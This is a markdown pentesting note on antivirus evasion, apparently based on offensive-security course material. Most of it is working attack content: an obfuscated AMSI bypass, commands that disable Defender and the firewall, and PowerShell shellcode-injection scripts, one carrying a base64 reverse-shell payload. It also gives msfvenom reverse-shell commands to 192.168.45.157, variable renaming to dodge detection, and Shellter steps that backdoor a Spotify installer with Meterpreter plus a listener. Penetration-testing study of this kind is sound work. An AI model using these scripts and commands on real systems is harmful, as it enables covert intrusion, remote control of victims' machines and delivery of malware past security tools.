---
title: Antivirus Evasion techniques
draft: false
author: amandaguglieri
TableOfContents: true
tags:
  - pentesting
  - evasion
---
# Antivirus Evasion techniques

Some tooling: [https://kleenscan.com](https://kleenscan.com/index) and [virustotal.com/](virustotal.com/gui/)


```powershell
# Lists available modules loaded for use.
Get-Module	

#  print the execution policy settings for each scope on a host.
Get-ExecutionPolicy -List	

# Check current execution policy. If the answer is
# - "Restricted": Ps scripts cannot run.
# - "RemoteSigned": Downloaded scripts will require the script to be signed by a trusted publisher.
Get-ExecutionPolicy

# Bypass execution policy
powershell -ep bypass

# Get current execution policy
Get-ExecutionPolicy -Scope CurrentUser

#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
Set-ExecutionPolicy Bypass -Scope Process	

# Set to unrestricted
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Enumerate AppLocker policies 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# If we find that a file cannot be run from a location, maybe we can try to run it from another location.

# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
$ExecutionContext.SessionState.LanguageMode

# Get the current Defender status.
Get-MpComputerStatus

# Deactivate antivirus from powershell session (if user has rights to do so)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable firewall
netsh advfirewall set allprofiles state off

# Bypass AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Add a registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

```


## On-Disk Evasion

Modern on-disk malware obfuscation can take many forms. One of the earliest ways of avoiding detection involved the use of [_packers_](https://en.wikipedia.org/wiki/Executable_compression). like  [_UPX_](https://upx.github.io/) and other popular packers.

[_The Enigma Protector_](http://www.enigmaprotector.com/en/home.html) can be used to successfully bypass antivirus products.

##  In-Memory Evasion

[_In-Memory Injections_](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process), also known as _PE Injection_, is a popular technique used to bypass antivirus products on Windows machines. Rather than obfuscating a malicious binary, this technique instead focuses on the manipulation of volatile memory.


### Remote Process Memory Injection

The first technique we are going to cover is _Remote Process Memory Injection_, which attempts to inject the payload into another valid PE that is not malicious. The most common method of doing this is by leveraging a set of [_Windows APIs_](https://en.wikipedia.org/wiki/Windows_API).

1. Use the [_OpenProcess_](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess) function to
2. obtain a valid [_HANDLE_](https://en.wikipedia.org/wiki/Handle_\(computing\)) to a target process that we have permission to access.
3. Then, allocate memory in the context of that process by calling a Windows API such as [_VirtualAllocEx_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex).
4. Once done, copy the malicious payload to the newly allocated memory using [_WriteProcessMemory_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
5.  Then, this is usually executed in memory in a separate thread using the [_CreateRemoteThread_](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) API.


### Regular DLL injection

Loading a malicious DLL from disk using the [_LoadLibrary_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) API.


#### Example 1
This is a typical vasic template script the performs in-memory injection:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```

The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively.  We will allocate the memory and execute a new thread in the current process (powershell.exe), rather than a remote one.

Now, we generate the shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f psh-reflection
```

And include the code as payload in the dll-injector-script.ps1:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';


function aPc6e {
        Param ($vPgB, $b5ZHP)
        $ps = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $ps.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ps.GetMethod('GetModuleHandle')).Invoke($null, @($vPgB)))), $b5ZHP))
}

function yhFD {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $uso,
                [Parameter(Position = 1)] [Type] $c4pg = [Void]
        )

        $vOH = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $vOH.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $uso).SetImplementationFlags('Runtime, Managed')
        $vOH.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $c4pg, $uso).SetImplementationFlags('Runtime, Managed')

        return $vOH.CreateType()
}

[Byte[]]$pL49 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaMCoLZ1oAgABu4nmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
[Uint32]$hZvN = 0
$n5S9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aPc6e kernel32.dll VirtualAlloc), (yhFD @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $pL49.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($pL49, 0, $n5S9, $pL49.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aPc6e kernel32.dll VirtualProtect), (yhFD @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($n5S9, [Uint32]$pL49.Length, 0x10, [Ref]$hZvN)) -eq $true) {
        $xn1s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aPc6e kernel32.dll CreateThread), (yhFD @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$n5S9,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((aPc6e kernel32.dll WaitForSingleObject), (yhFD @([IntPtr], [Int32]))).Invoke($xn1s,0xffffffff) | Out-Null
}
```

Save it as dll-injector-script.ps1. Open a netcat listener in the kali. And run it. Since the msfvenom payload is for x86, we are going to launch the x86 version of PowerShell, named _Windows PowerShell (x86)_, as depicted in the image below.

#### Example 2

Similarly, we may have this other template:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

[Byte[]]$sc = <place your shellcode here>
$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFun::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr] ($x.ToInt32()+$i),$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) {Start-sleep 60};
```

And for the payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f powershell -v sc
```

Since the msfvenom payload is for x86, we are going to launch the x86 version of PowerShell, named _Windows PowerShell (x86)_, as depicted in the image below.


### Example 3

Let's replicate now example 2, but changing some variable names to make it more difficult for AV to detect it.

We may modify the naming. For instance, instead of `$sc` we will use `var1`. And instead of `$winFunc` we will use `$var2`. Then the template would be:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]]$var1 = <place your shellcode here>
$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr] ($x.ToInt32()+$i),$var1[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) {Start-sleep 60};
```

Since the msfvenom payload is for x86, we are going to launch the x86 version of PowerShell, named _Windows PowerShell (x86)_, as depicted in the image below.



### Reflective DLL injection 

**Reflective DLL loading** refers to loading a DLL from memory rather than from disk. Windows doesn’t have a LoadLibrary function that supports this, so to get the functionality you have to write your own, omitting some of the things Windows normally does, such as registering the DLL as a loaded module in the process , potentially bypassing DLL load monitoring. ([source](https://andreafortuna.org//2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/))

The [_Reflective DLL Injection_](https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/) technique attempts to load a DLL stored by the attacker in the process memory.

The process of reflective DLL injection is as follows:

1. Open target process with read-write-execute permissions and allocate memory large enough for the DLL.
2. Copy the DLL into the allocated memory space.
3. Calculate the memory offset within the DLL to the export used for doing reflective loading.
4. Call `CreateRemoteThread` (or an equivalent undocumented API function like `RtlCreateUserThread`) to start execution in the remote process, using the offset address of the reflective loader function as the entry point.
5. The reflective loader function finds the Process Environment Block of the target process using the appropriate CPU register, and uses that to find the address in memory of `kernel32.dll` and any other required libraries.
6. Parse the exports directory of kernel32 to find the memory addresses of required API functions such as `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
7. Use these functions to then properly load the DLL (itself) into memory and call its entry point, DllMain.

More information and PoC code can be reviewed on [this GitHub repo](https://github.com/stephenfewer/ReflectiveDLLInjection) by [Stephen Fewer](https://twitter.com/stephenfewer):

> The process of remotely injecting a library into a process is two fold. Firstly, the library you wish to inject must be written into the address space of the target process (Herein referred to as the host process). Secondly the library must be loaded into that host process in such a way that the library's run time expectations are met, such as resolving its imports or relocating it to a suitable location in memory.

[Another technique](https://zerosum0x0.blogspot.in/2017/07/threadcontinue-reflective-injection.html) for reflecting DLL injection is the usage of **SetThreadContext()** and **NtContinue()**, made by [zerosum0x0](https://twitter.com/zerosum0x0).


### Process Hollowing

[Process Hollowing](https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations).

When using process hollowing to bypass antivirus software, attackers first launch a non-malicious process in a suspended state. Once launched, the image of the process is removed from memory and replaced with a malicious executable image. Finally, the process is then resumed, and malicious code is executed instead of the legitimate process.


### Rootkits

Hooking is a technique often employed by [_rootkits_](https://en.wikipedia.org/wiki/Rootkit), a stealthier kind of malware. Rootkits aim to provide the malware author dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS [_protection rings_](https://en.wikipedia.org/wiki/Protection_ring) such as _boot_ or _hypervisor_.


## Tools

### Shellter

[_Shellter_](https://www.shellterproject.com/) is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses several novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload. Shellter attempts to use the existing PE [_Import Address Table_](https://en.wikipedia.org/wiki/Portable_Executable#Import_Table) (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.

Install:

```bash
sudo apt install shellter
```

Since Shellter is designed to be run on Windows operating systems, we will also install wine, a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.

```bash
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```

If we are using an ARM processor, we need to a slightly different set of commands.

```bash
sudo apt install wine
sudo dpkg --add-architecture amd64
sudo  apt install -y qemu-user-static binfmt-support
sudo apt-get update && apt-get install wine32
```

Shellter can run in either Auto or Manual mode. In Manual mode, the tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level. We can use this mode to highly customize the injection process in case the automatically selected options fail.

![[shellter.png]]

For the purposes of this example however, we will run Shellter in Auto mode by selecting **A** at the prompt. We will need a 32 exe file like the one provided by the Offsec, the SpotifySetup.exe. Select A.

Next we will be prompted:

```text
Enable Stealth Mode? (Y/N/H): Y


************                                                                                                                              
* Payloads *                                                                                                                              
************                                                                                                                              
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec

Use a listed payload or custom? (L/C/H): L
  
Select payload by index: 1                                                                                                                
***************************                                                                                                               
* meterpreter_reverse_tcp *                                                                                                               
***************************                                                           
SET LHOST: 192.168.45.157                                                             
SET LPORT: 443     
```

With all the parameters set, Shellter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload.

Now that the test has succeeded, before transferring over the malicious PE file to our Windows client, we will configure a listener on our Kali machine to interact with the Meterpreter payload. We can accomplish this with the following one-liner, remembering to replace the IP address with the one on our Kali box.

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.157;set LPORT 443;run;"
```

Next, we will transfer the backdoored Spotify installer over to the target Windows 11 client.

Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, the antivirus's signature-based scan runs cleanly. It does not consider the binary malicious.